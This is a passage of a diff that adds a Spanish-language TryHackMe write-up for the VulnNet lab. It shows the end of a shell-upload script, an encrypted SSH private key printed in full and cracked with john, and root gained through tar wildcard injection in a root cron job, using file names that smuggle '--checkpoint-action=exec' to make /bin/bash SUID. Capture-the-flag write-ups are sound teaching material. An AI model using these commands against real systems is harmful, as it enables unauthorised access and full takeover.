+		</span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="k">${</span><span class="nv">redColor</span><span class="k">}</span><span class="s2">[x] An error was ocurred</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}</span><span class="s2">"</span>
+		<span class="nb">exit </span>1
+	<span class="k">fi
+	</span>tput cnorm
+<span class="o">}</span>
+
+<span class="c">#-----------------------------------------------&gt;</span>
+
+<span class="k">if</span> <span class="o">[[</span> <span class="o">!</span> <span class="s2">"</span><span class="nv">$ip</span><span class="s2">"</span> <span class="o">||</span> <span class="o">!</span> <span class="s2">"</span><span class="nv">$port</span><span class="s2">"</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then
+	</span>helpPanel
+<span class="k">else
+	</span>uploadYgainShell
+<span class="k">fi</span>
+</code></pre></div></div>
+<p>Siguiendo con la escalada de privilegios para convertirnos en el usuario server-management, primero hacemos un tratamiento de la tty como ya lo expliqué en <a href="google.com">este</a> post, esto básicamente para tener una tty full interactiva
+Encontramos un directorio que puede ser de mucha utilidad: <code class="language-plaintext highlighter-rouge">/var/backups</code> en este vemos un <code class="language-plaintext highlighter-rouge">ssh-backup.tar.gz</code></p>
+
+<p>Nos metemos en /tmp</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cd</span> /tmp
+</code></pre></div></div>
+<p>Copiamos el <code class="language-plaintext highlighter-rouge">ssh-backup.tar.gz</code> dentro del directorio <code class="language-plaintext highlighter-rouge">/tmp</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cp </span>ssh-backup.tar.gz /tmp/.
+</code></pre></div></div>
+<p>Lo descomprimimos con <strong>tar</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">tar</span> <span class="nt">-xf</span> ssh-backup.tar.gz
+</code></pre></div></div>
+<p>Y vemos que tenemos una id_rsa</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">ls
+</span>id_rsa
+ssh-backup.tar.gz
+</code></pre></div></div>
+<p>Si la intentamos usar, veremos que nos pedirá contraseña, así que vamos a copiarnola en unestra máquina de atacante e intentemos romperla con <a href="https://github.com/openwall/john/blob/bleeding-jumbo/run/ssh2john.py">ssh2john</a></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~<span class="nv">$&gt;</span> <span class="nb">echo</span> <span class="s2">"-----BEGIN RSA PRIVATE KEY-----  
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,6CE1A97A7DAB4829FE59CC561FB2CCC4
+
+mRFDRL15t7qvaZxJGHDJsewnhp7wESbEGxeAWtCrbeIVJbQIQd8Z8SKzpvTMFLtt
+dseqsGtt8HSruVIq++PFpXRrBDG5F4rW5B6VDOVMk1O9J4eHEV0N7es+hZ22o2e9
+60qqj7YkSY9jVj5Nqq49uUNUg0G0qnWh8M6r8r83Ov+HuChdeNC5CC2OutNivl7j
+dmIaFRFVwmWNJUyVen1FYMaxE+NojcwsHMH8aV2FTiuMUsugOwZcMKhiRPTElojn
+tDrlgNMnP6lMkQ6yyJEDNFtn7tTxl7tqdCIgB3aYQZXAfpQbbfJDns9EcZEkEkrp
+hs5Li20NbZxrtI6VPq6/zDU1CBdy0pT58eVyNtDfrUPdviyDUhatPACR20BTjqWg
+3BYeAznDF0MigX/AqLf8vA2HbnRTYWQSxEnAHmnVIKaNVBdL6jpgmw4RjGzsUctk
+jB6kjpnPSesu4lSe6n/f5J0ZbOdEXvDBOpu3scJvMTSd76S4n4VmNgGdbpNlayj5
+5uJfikGR5+C0kc6PytjhZrnODRGfbmlqh9oggWpflFUm8HgGOwn6nfiHBNND0pa0
+r8EE1mKUEPj3yfjLhW6PcM2OGEHHDQrdLDy3lYRX4NsCRSo24jtgN1+aQceNFXQ7
+v8Rrfu5Smbuq3tBjVgIWxolMy+a145SM1Inewx4V4CX1jkk6sp0q9h3D03BYxZjz
+n/gMR/cNgYjobbYIEYS9KjZSHTucPANQxhUy5zQKkb61ymsIR8O+7pHTeReelPDq
+nv7FA/65Sy3xSUXPn9nhqWq0+EnhLpojcSt6czyX7Za2ZNP/LaFXpHjwYxBgmMkf
+oVmLmYrw6pOrLHb7C5G6eR6D/WwRjhPpuhCWWnz+NBDQXIwUzzQvAyHyb7D1+Itn
+MesF+L9zuUADGeuFl12dLahapM5ZuKURwnzW9+RwmmJSuT0AnN5OyuJtwfRznjyZ
+7f5NP9u6vF0NQHYZI7MWcH7PAQsGTw3xzBmJdIfF71DmG0rqqCR7sB2buhoI4ve3
+obvpmg2CvE+rnGS3wxuaEO0mWxVrSYiWdi7LJZvppwRF23AnNYNTeCw4cbvvCBUd
+hKvhau01yVW2N/R8B43k5G9qbeNUmIZIltJZaxHnQpJGIbwFSItih49Fyr29nURK
+ZJbyJbb4+Hy2ZNN4m/cfPNmCFG+w0A78iVPrkzxdWuTaBOKBstzpvLBA20d4o3ow
+wC6j98TlmFUOKn5kJmX1EQAHJmNwERNKFmNwgHqgwYNzIhGRNdyoqJxBrshVjRk9
+GSEZHtyGNoBqesyZg8YtsYIFGppZFQmVumGCRlfOGB9wPcAmveC0GNfTygPQlEMS
+hoz4mTIvqcCwWibXME2g8M9NfVKs7M0gG5Xb93MLa+QT7TyjEn6bDa01O2+iOXkx
+0scKMs4v3YBiYYhTHOkmI5OX0GVrvxKVyCJWY1ldVfu+6LEgsQmUvG9rYwO4+FaW
+4cI3x31+qDr1tCJMLuPpfsyrayBB7duj/Y4AcWTWpY+feaHiDU/bQk66SBqW8WOb
+d9vxlTg3xoDcLjahDAwtBI4ITvHNPp+hDEqeRWCZlKm4lWyI840IFMTlVqwmxVDq
+-----END RSA PRIVATE KEY-----"</span> <span class="o">&gt;</span> id_rsa_to_crack
+</code></pre></div></div>
+<p>Usamos <strong>ssh2john</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~<span class="nv">$&gt;</span>./ssh2john.py id_rsa_to_crack <span class="o">&gt;</span> id_rsa
+</code></pre></div></div>
+<p>Y despues <strong>john</strong> para romperla</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~<span class="nv">$&gt;</span> john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt id_rsa
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>SSH <span class="o">[</span>RSA/DSA/EC/OPENSSH <span class="o">(</span>SSH private keys<span class="o">)</span> 32/64]<span class="o">)</span>
+Cost 1 <span class="o">(</span>KDF/cipher <span class="o">[</span><span class="nv">0</span><span class="o">=</span>MD5/AES <span class="nv">1</span><span class="o">=</span>MD5/3DES <span class="nv">2</span><span class="o">=</span>Bcrypt/AES]<span class="o">)</span> is 0 <span class="k">for </span>all loaded hashes
+Cost 2 <span class="o">(</span>iteration count<span class="o">)</span> is 1 <span class="k">for </span>all loaded hashes
+Will run 2 OpenMP threads
+Note: This format may emit <span class="nb">false </span>positives, so it will keep trying even after
+finding a possible candidate.
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+o&lt;<span class="k">***</span>CENSORED<span class="k">***</span><span class="o">&gt;</span>c     <span class="o">(</span>id_rsa<span class="o">)</span>
+1g 0:00:00:13 DONE <span class="o">(</span>2021-08-31 03:40<span class="o">)</span> 0.07570g/s 1085Kp/s 1085Kc/s 1085KC/sa6_123..<span class="k">*</span>7¡Vamos!
+Session completed
+</code></pre></div></div>
+<p>Ahora le asignamos el privilegio <code class="language-plaintext highlighter-rouge">600</code> a <code class="language-plaintext highlighter-rouge">id_rsa</code> para que no nos de problemas al momento de usarla</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~<span class="nv">$&gt;</span> <span class="nb">chmod </span>600 id_rsa
+</code></pre></div></div>
+<p>Y la usamos para conectarnos por <strong>ssh</strong> como el usuario <strong>server-management</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~<span class="nv">$&gt;</span> ssh <span class="nt">-i</span> id_rsa server-management@vulnnet.thm
+Enter passphrase <span class="k">for </span>key <span class="s1">'id_rsa'</span>:
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Welcome to Ubuntu 18.04 LTS <span class="o">(</span>GNU/Linux 4.15.0-134-generic x86_64<span class="o">)</span>
+
+ <span class="k">*</span> Documentation:  https://help.ubuntu.com
+ <span class="k">*</span> Management:     https://landscape.canonical.com
+ <span class="k">*</span> Support:        https://ubuntu.com/advantage
+
+ <span class="k">*</span> Introducing self-healing high availability clusters <span class="k">in </span>MicroK8s.
+   Simple, hardened, Kubernetes <span class="k">for </span>production, from RaspberryPi to DC.
+
+     https://microk8s.io/high-availability
+
+ <span class="k">*</span> Canonical Livepatch is available <span class="k">for </span>installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+560 packages can be updated.
+359 updates are security updates.
+
+
+The programs included with the Ubuntu system are free software<span class="p">;</span>
+the exact distribution terms <span class="k">for </span>each program are described <span class="k">in </span>the
+individual files <span class="k">in</span> /usr/share/doc/<span class="k">*</span>/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+server-management@vulnnet:~<span class="nv">$ </span><span class="nb">whoami
+</span>server-management
+</code></pre></div></div>
+<p>Ahora podemos ver el <code class="language-plaintext highlighter-rouge">user.txt</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>server-management@vulnnet:~<span class="nv">$ </span><span class="nb">cat </span>user.txt 
+THM<span class="o">{</span>9&lt;<span class="k">***</span>CENSORED<span class="k">***</span><span class="o">&gt;</span>b<span class="o">}</span>
+</code></pre></div></div>
+
+<p>Para obtener el root debemos de escalar privilegios abusando de un <strong>wildcard</strong> dentro de un archivo que usa <strong>tar</strong>
+Este archivo está dentro de <code class="language-plaintext highlighter-rouge">/var/opt</code> y contiene lo siguiente:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>server-management@vulnnet:~<span class="nv">$ </span><span class="nb">cat</span> /var/opt/backupsrv.sh
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+<span class="c"># Where to backup to.</span>
+<span class="nv">dest</span><span class="o">=</span><span class="s2">"/var/backups"</span>
+
+<span class="c"># What to backup. </span>
+<span class="nb">cd</span> /home/server-management/Documents
+<span class="nv">backup_files</span><span class="o">=</span><span class="s2">"*"</span>
+
+<span class="c"># Create archive filename.</span>
+<span class="nv">day</span><span class="o">=</span><span class="si">$(</span><span class="nb">date</span> +%A<span class="si">)</span>
+<span class="nb">hostname</span><span class="o">=</span><span class="si">$(</span><span class="nb">hostname</span> <span class="nt">-s</span><span class="si">)</span>
+<span class="nv">archive_file</span><span class="o">=</span><span class="s2">"</span><span class="nv">$hostname</span><span class="s2">-</span><span class="nv">$day</span><span class="s2">.tgz"</span>
+
+<span class="c"># Print start status message.</span>
+<span class="nb">echo</span> <span class="s2">"Backing up </span><span class="nv">$backup_files</span><span class="s2"> to </span><span class="nv">$dest</span><span class="s2">/</span><span class="nv">$archive_file</span><span class="s2">"</span>
+<span class="nb">date
+echo</span>
+
+<span class="c"># Backup the files using tar.</span>
+<span class="nb">tar </span>czf <span class="nv">$dest</span>/<span class="nv">$archive_file</span> <span class="nv">$backup_files</span>
+
+<span class="c"># Print end status message.</span>
+<span class="nb">echo
+echo</span> <span class="s2">"Backup finished"</span>
+<span class="nb">date</span>
+
+<span class="c"># Long listing of files in $dest to check file sizes.</span>
+<span class="nb">ls</span> <span class="nt">-lh</span> <span class="nv">$dest</span>
+</code></pre></div></div>
+<p>Básicamente se encarga de hacer backups de todo lo que esté dentro del directorio <code class="language-plaintext highlighter-rouge">/home/server-management/Documents</code> durante intervalos regulares de tiempo (tarea <strong>cron</strong>)</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>server-management@vulnnet:~<span class="nv">$ </span><span class="nb">cat</span> /etc/crontab
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># /etc/crontab: system-wide crontab</span>
+<span class="c"># Unlike any other crontab you don't have to run the `crontab'</span>
+<span class="c"># command to install the new version when you edit this file</span>
+<span class="c"># and files in /etc/cron.d. These files also have username fields,</span>
+<span class="c"># that none of the other crontabs do.</span>
+
+<span class="nv">SHELL</span><span class="o">=</span>/bin/sh
+<span class="nv">PATH</span><span class="o">=</span>/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+<span class="c"># m h dom mon dow user  command</span>
+<span class="k">*</span>/2   <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="k">*</span>   root    /var/opt/backupsrv.sh <span class="c"># &lt;- ESTE ES EL QUE NOS INTERESA</span>
+17 <span class="k">*</span>    <span class="k">*</span> <span class="k">*</span> <span class="k">*</span>   root    <span class="nb">cd</span> / <span class="o">&amp;&amp;</span> run-parts <span class="nt">--report</span> /etc/cron.hourly
+25 6    <span class="k">*</span> <span class="k">*</span> <span class="k">*</span>   root    <span class="nb">test</span> <span class="nt">-x</span> /usr/sbin/anacron <span class="o">||</span> <span class="o">(</span> <span class="nb">cd</span> / <span class="o">&amp;&amp;</span> run-parts <span class="nt">--report</span> /etc/cron.daily <span class="o">)</span>
+47 6    <span class="k">*</span> <span class="k">*</span> 7   root    <span class="nb">test</span> <span class="nt">-x</span> /usr/sbin/anacron <span class="o">||</span> <span class="o">(</span> <span class="nb">cd</span> / <span class="o">&amp;&amp;</span> run-parts <span class="nt">--report</span> /etc/cron.weekly <span class="o">)</span>
+52 6    1 <span class="k">*</span> <span class="k">*</span>   root    <span class="nb">test</span> <span class="nt">-x</span> /usr/sbin/anacron <span class="o">||</span> <span class="o">(</span> <span class="nb">cd</span> / <span class="o">&amp;&amp;</span> run-parts <span class="nt">--report</span> /etc/cron.monthly <span class="o">)</span>
+<span class="c">#</span>
+</code></pre></div></div>
+<p>Finalmente para obtener el root, entramos en <code class="language-plaintext highlighter-rouge">/home/server-management/Documents</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>server-management@vulnnet:~<span class="nv">$ </span><span class="nb">cd </span>Documents
+</code></pre></div></div>
+<p>Ejecutamos los siguientes comandos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>server-management@vulnnet:~/Documents<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"chmod 4755 /bin/bash"</span> <span class="o">&gt;</span> privesc.sh
+server-management@vulnnet:~/Documents<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">""</span> <span class="o">&gt;</span> <span class="s2">"--checkpoint-action=exec=sh privesc.sh"</span>
+server-management@vulnnet:~/Documents<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">""</span> <span class="o">&gt;</span> <span class="nt">--checkpoint</span><span class="o">=</span>1
+</code></pre></div></div>
+
+<p>Esto nos creará archivos con nombres de parametros de <strong>tar</strong>, por lo que cuando se ejecute el script y tar englobe todos los archivos con el wildcard, se confundirá con los nombres de los ficheros que creamos, ejecutando la instrución maliciosa que querramos, en este caso asignar privilegios <strong>SUID</strong> a la <code class="language-plaintext highlighter-rouge">/bin/bash</code> (chmod 4755 /bin/bash)</p>
+
+<p>Esperamos un poco despues de lo anterior y abusamos del privilegio <strong>SUID</strong> que se le asignó a la <code class="language-plaintext highlighter-rouge">/bin/bash</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>server-management@vulnnet:~/Documents<span class="nv">$ </span>bash <span class="nt">-p</span>
+</code></pre></div></div>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">-p</code> -&gt; Para <strong>atender</strong> al privilegio <strong>SUID</strong></li>
+</ul>
+
+<p>Vemos que somos root</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-4.4# <span class="nb">whoami
+</span>root
+</code></pre></div></div>
+<p>Y podemos leer la flag <strong>root.txt</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-4.4# <span class="nb">cat</span> /root/root.txt
+THM<span class="o">{</span>2&lt;<span class="k">***</span>CENSORED<span class="k">***</span><span class="o">&gt;</span>a<span class="o">}</span>
+</code></pre></div></div>
+<p><strong>:)</strong></p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#autopwm" class="page__taxonomy-item" rel="tag">autopwm</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#bash-scripting" class="page__taxonomy-item" rel="tag">bash scripting</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#cron" class="page__taxonomy-item" rel="tag">cron</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#lfi" class="page__taxonomy-item" rel="tag">lfi</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#tar" class="page__taxonomy-item" rel="tag">tar</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#web" class="page__taxonomy-item" rel="tag">web</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#wildcard" class="page__taxonomy-item" rel="tag">wildcard</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#scripting" class="page__taxonomy-item" rel="tag">scripting</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#tryhackme" class="page__taxonomy-item" rel="tag">tryhackme</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2021-08-31T00:00:00-05:00">August 31, 2021</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/thm-dogcat/" class="pagination--pager" title="Dogcat (AutoPWM) - Try Hack Me
+">Previous</a>
+    
+    
+      <a href="#" class="pagination--pager disabled">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2021 Invertebrado</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
